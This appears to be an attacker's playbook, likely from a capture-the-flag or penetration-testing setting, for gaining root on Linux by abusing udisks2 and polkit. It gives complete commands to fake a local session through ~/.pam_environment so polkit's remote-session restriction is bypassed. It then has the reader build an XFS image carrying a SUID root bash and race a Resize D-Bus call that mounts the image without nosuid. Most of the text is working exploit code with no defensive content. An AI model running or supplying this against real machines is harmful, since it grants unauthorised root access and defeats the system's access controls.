# UDisks2/Polkit Privilege Escalation (filesystem mount abuse)

## When this applies

- Target is a Linux system with udisks2 and polkit installed. Check with `which udisksctl gdbus` and `systemctl status udisks2`.
- Polkit's `allow_active=yes` for `org.freedesktop.udisks2.loop-setup` means active sessions can mount loop devices without authentication.

## Prerequisites

- `udisksctl`, `gdbus` available on target
- `udisks2` service running
- Active local session (or ability to fake one — see Session Bypass below)
- Ability to transfer files to target (SCP, wget, curl)

## Session Bypass for Remote/SSH Sessions

If your session shows `Remote=yes` (polkit denies `allow_active` for remote sessions):

```bash
# Write PAM environment to fake local session properties
echo "XDG_SEAT=seat0" > ~/.pam_environment
echo "XDG_VTNR=1" >> ~/.pam_environment
# Disconnect and reconnect SSH — new session inherits seat0
# Verify: loginctl show-session $SESSION -p Seat should show seat0
```

## Exploit (XFS SUID mount)

1. Create XFS image with SUID root shell (on attacker machine with root, match target arch):

```bash
docker run --rm --privileged --platform linux/amd64 -v /tmp:/tmp opensuse/leap:15.6 bash -c '
  zypper -n in xfsprogs > /dev/null 2>&1
  dd if=/dev/zero of=/tmp/xfs.image bs=1M count=300 status=none
  mkfs.xfs -q /tmp/xfs.image
  mkdir -p /tmp/m && mount -t xfs /tmp/xfs.image /tmp/m
  chmod 777 /tmp/m
  cp /usr/bin/bash /tmp/m/bash
  chown root:root /tmp/m/bash && chmod 4755 /tmp/m/bash
  umount /tmp/m'
```

2. Transfer to target: `scp /tmp/xfs.image user@target:/tmp/`
3. Setup loop device: `udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction`
4. Start busy-keepers (race the temporary mount):

```bash
for i in $(seq 1 20); do
  (while true; do /tmp/blockdev*/bash -p -c "sleep 60" 2>/dev/null && break; sleep 0.02; done) &
done
```

5. Trigger resize (mounts XFS temporarily WITHOUT nosuid):

```bash
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
```

6. Use SUID shell: `/tmp/blockdev*/bash -p -c "id; cat /root/root.txt"`

## Critical details

- XFS root dir MUST be `chmod 777` — the blockdev temp dir is 700 root, but mount overrides with XFS root perms
- Bash binary MUST match target architecture (x86_64 on x86_64, not aarch64)
- Use glibc-based distro in Docker (not Alpine/musl) — binary must be compatible
- Multiple busy-keeper processes increase race win probability

## Verifying success

- `/tmp/blockdev*/bash -p` returns root shell.
- `id` reports `euid=0(root)`.

## Common pitfalls

- Remote SSH sessions get `Remote=yes` and polkit denies `allow_active` — bypass with `~/.pam_environment` (XDG_SEAT/XDG_VTNR).
- Architecture mismatch breaks SUID bash — verify via `file /usr/bin/bash` on target.
- Alpine/musl binaries are NOT compatible with glibc targets — use glibc base image.

## Tools

- udisksctl
- gdbus
- mkfs.xfs
- docker (for image construction)
